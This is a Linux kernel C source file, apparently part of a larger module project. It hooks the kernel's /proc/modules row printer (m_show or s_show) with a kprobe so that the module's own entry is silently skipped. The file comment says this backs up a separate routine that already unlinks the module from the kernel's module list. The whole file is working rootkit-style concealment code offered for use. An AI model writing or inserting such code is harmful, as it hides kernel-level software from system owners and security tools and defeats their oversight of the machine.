// SPDX-License-Identifier: GPL-2.0-only
/* C.1: /proc/modules seq_file iterator scrub.
 *
 * Even after conceal_module() strips us from `modules` list, defence in depth
 * is cheap: hook the seq_file per-entry callback that writes each row and
 * skip our module if it ever surfaces again (e.g. a livepatch reinserted us
 * or a downstream vendor forked the list walker). Kernel 6.x renamed the
 * function to `m_show`; older trees keep the historical `s_show`. Try both
 * — one is enough. */

#include <linux/errno.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/ptrace.h>
#include <linux/seq_file.h>
#include <linux/types.h>

#include "kallsym.h"
#include "log.h"
#include "module_hide.h"

static struct kprobe kp_m_show;
static bool armed;

/* m_show(seq_file *m, void *p): p is a struct list_head* pointing at our
 * module's .list field if this iteration is for us. Compare via list_entry
 * without dereferencing p (still safe when p == &THIS_MODULE->list). */
static int m_show_pre(struct kprobe *p, struct pt_regs *regs) {
	struct list_head *lh;
	struct module *mod;

	(void)p;
	if (!regs)
		return 0;
	lh = (struct list_head *)regs->regs[1];
	if (!lh)
		return 0;
	mod = list_entry(lh, struct module, list);
	if (mod != THIS_MODULE)
		return 0;

	/* Skip original m_show; return 0 so seq_file marks the entry emitted
	 * without any characters (equivalent to a silent "hidden" row). */
	regs->regs[0] = 0;
	instruction_pointer_set(regs, procedure_link_pointer(regs));
	return 1;
}

int module_hide_arm(void) {
	unsigned long addr;
	int rc;

	if (armed)
		return 0;

	addr = kallsym_lookup("m_show");
	if (!addr)
		addr = kallsym_lookup("s_show");
	if (!addr) {
		LOGN("module_hide: neither m_show nor s_show in kallsyms\n");
		return -ENOENT;
	}

	memset(&kp_m_show, 0, sizeof(kp_m_show));
	kp_m_show.addr = (kprobe_opcode_t *)addr;
	kp_m_show.pre_handler = m_show_pre;
	rc = register_kprobe(&kp_m_show);
	if (rc) {
		LOGE("module_hide: register_kprobe failed: %d\n", rc);
		return rc;
	}
	armed = true;
	LOGI("module_hide: /proc/modules scrub armed @ %px\n", (void *)addr);
	return 0;
}

void module_hide_disarm(void) {
	if (!armed)
		return;
	unregister_kprobe(&kp_m_show);
	armed = false;
}
